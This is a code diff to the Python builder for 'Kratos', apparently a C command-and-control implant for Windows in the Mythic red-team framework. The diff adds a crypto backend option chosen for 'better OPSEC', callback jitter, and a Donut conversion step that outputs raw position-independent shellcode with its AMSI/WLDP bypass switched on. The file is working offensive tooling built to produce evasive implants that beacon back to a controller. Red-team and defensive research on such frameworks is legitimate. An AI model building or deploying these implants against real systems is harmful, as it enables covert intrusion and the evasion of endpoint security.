@@ -8,6 +8,7 @@ import asyncio
 import tempfile
 from distutils.dir_util import copy_tree
 import json
+import donut
 
 class Kratos(PayloadType):
     name = "kratos"
@@ -18,7 +19,7 @@ class Kratos(PayloadType):
     wrapped_payloads = []
     note = "A simple C agent named Kratos."
     supports_dynamic_loading = True
-    mythic_encrypts = False
+    mythic_encrypts = True
     c2_profiles = ["http"]
     build_parameters = [
         BuildParameter(
@@ -26,7 +27,21 @@ class Kratos(PayloadType):
             parameter_type=BuildParameterType.Boolean,
             default_value=False,
             description="Enable debug output"
-        )
+        ),
+        BuildParameter(
+            name="crypto_backend",
+            parameter_type=BuildParameterType.ChooseOne,
+            choices=["tiny_aes", "bcrypt"],
+            default_value="tiny_aes",
+            description="Crypto backend: tiny_aes (embedded, no DLL imports, better OPSEC) or bcrypt (Windows API)"
+        ),
+        BuildParameter(
+            name="output_format",
+            parameter_type=BuildParameterType.ChooseOne,
+            choices=["exe", "shellcode"],
+            default_value="exe",
+            description="Output format: Executable or Raw Shellcode (via Donut)"
+        ),
     ]
     agent_path = pathlib.Path(".") / "kratos" / "mythic"
     agent_code_path = pathlib.Path(".") / "kratos" / "agent_code"
@@ -36,6 +51,7 @@ class Kratos(PayloadType):
         BuildStep(step_name="Gathering Files", step_description="Copying agent code to build directory"),
         BuildStep(step_name="Configuring", step_description="Stamping in configuration values"),
         BuildStep(step_name="Compiling", step_description="Compiling the agent"),
+        BuildStep(step_name="Generating Shellcode", step_description="Using Donut to generate a position-independent shellcode"),
     ]
 
     async def build(self) -> BuildResponse:
@@ -63,7 +79,12 @@ class Kratos(PayloadType):
             callback_host = c2_conf.get("callback_host", "http://127.0.0.1")
             callback_port = c2_conf.get("callback_port", 80)
             callback_interval = c2_conf.get("callback_interval", 10)
-            post_uri = c2_conf.get("post_uri", "/api/v1.4/agent_message")
+            callback_jitter = c2_conf.get("callback_jitter", 0)
+            post_uri_raw = c2_conf.get("post_uri", "/api/v1.4/agent_message")
+            if isinstance(post_uri_raw, dict):
+                post_uri = post_uri_raw.get("value", "/api/v1.4/agent_message")
+            else:
+                post_uri = str(post_uri_raw) if post_uri_raw else "/api/v1.4/agent_message"
             if not post_uri.startswith("/"):
                 post_uri = "/" + post_uri
             
@@ -83,11 +104,18 @@ class Kratos(PayloadType):
             
             aes_psk = c2_conf.get("AESPSK", "")
             
-            # DEBUG: Log the raw AESPSK value
+            # DEBUG: Log C2 config for diagnostics
             await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                 PayloadUUID=self.uuid,
                 StepName="Extracting AESPSK",
-                StepStdout=f"Raw AESPSK from c2_conf: Type={type(aes_psk).__name__}, Value={repr(aes_psk)[:200]}",
+                StepStdout=(
+                    f"C2 Config:\n"
+                    f"  callback_host = {callback_host}\n"
+                    f"  callback_port = {callback_port}\n"
+                    f"  post_uri      = {post_uri}\n"
+                    f"  sleep         = {callback_interval}s\n"
+                    f"  AESPSK type   = {type(aes_psk).__name__}, value = {repr(aes_psk)[:100]}"
+                ),
                 StepSuccess=True
             ))
             
@@ -136,6 +164,9 @@ class Kratos(PayloadType):
             is_debug = self.get_parameter("debug")
             debug_val = 1 if is_debug else 0
 
+            crypto_backend = self.get_parameter("crypto_backend")
+            crypto_define = "-DUSE_TINY_AES" if crypto_backend == "tiny_aes" else "-DUSE_BCRYPT"
+
             # Read the template config.h file
             config_path = pathlib.Path(agent_build_path.name) / "config.h"
             with open(config_path, "r") as f:
@@ -152,6 +183,7 @@ class Kratos(PayloadType):
             config_content = config_content.replace("%DEBUG_VAL%", str(debug_val)).replace("% DEBUG_VAL %", str(debug_val))
             config_content = config_content.replace("%AESPSK%", aes_psk).replace("% AESPSK %", aes_psk)
             config_content = config_content.replace("%ENCRYPTED_EXCHANGE%", encrypted_exchange_val).replace("% ENCRYPTED_EXCHANGE %", encrypted_exchange_val)
+            config_content = config_content.replace("%CALLBACK_JITTER%", str(callback_jitter)).replace("% CALLBACK_JITTER %", str(callback_jitter))
 
             # Write the patched content back
             with open(config_path, "w") as f:
@@ -174,8 +206,8 @@ class Kratos(PayloadType):
                 StepSuccess=True
             ))
 
-            # Pass CFLAGS to make
-            command = f"make CC=x86_64-w64-mingw32-gcc CFLAGS=\"{command_defines}\""
+            # Pass CFLAGS to make (commandes + backend crypto)
+            command = f"make CC=x86_64-w64-mingw32-gcc CFLAGS=\"{command_defines} {crypto_define} -DBUILD\""
             
             proc = await asyncio.create_subprocess_shell(
                 command,
@@ -197,17 +229,46 @@ class Kratos(PayloadType):
                 ))
                 return resp
 
-            resp.payload = open(pathlib.Path(agent_build_path.name) / "kratos.exe", "rb").read()
-            resp.updated_filename = self.filename
-            resp.build_message = "Successfully built Kratos agent"
-            resp.status = BuildStatus.Success
-            
             await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                 PayloadUUID=self.uuid,
                 StepName="Compiling",
                 StepStdout=stdout.decode(),
                 StepSuccess=True
             ))
+
+            output_format = self.get_parameter("output_format")
+            exe_path = pathlib.Path(agent_build_path.name) / "kratos.exe"
+
+            if output_format == "shellcode":
+                try:
+                    # Génère le shellcode x64 via Donut
+                    # arch=2 (x64), bypass=3 (AMSI/WLDP), format=1 (raw)
+                    payload = donut.create(
+                        file=str(exe_path),
+                        arch=2,
+                        bypass=3,
+                        format=1
+                    )
+                    resp.payload = payload
+                    resp.updated_filename = self.filename if self.filename.endswith(".bin") else self.filename + ".bin"
+                    resp.build_message = "Successfully built Kratos shellcode"
+                    
+                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
+                        PayloadUUID=self.uuid,
+                        StepName="Generating Shellcode",
+                        StepStdout="Shellcode generated successfully with Donut.",
+                        StepSuccess=True
+                    ))
+                except Exception as e:
+                    resp.status = BuildStatus.Error
+                    resp.build_message = f"Failed to generate shellcode: {str(e)}"
+                    return resp
+            else:
+                resp.payload = open(exe_path, "rb").read()
+                resp.updated_filename = self.filename if self.filename.endswith(".exe") else self.filename + ".exe"
+                resp.build_message = "Successfully built Kratos agent (exe)"
+
+            resp.status = BuildStatus.Success
 
         except Exception as e:
             resp.status = BuildStatus.Error
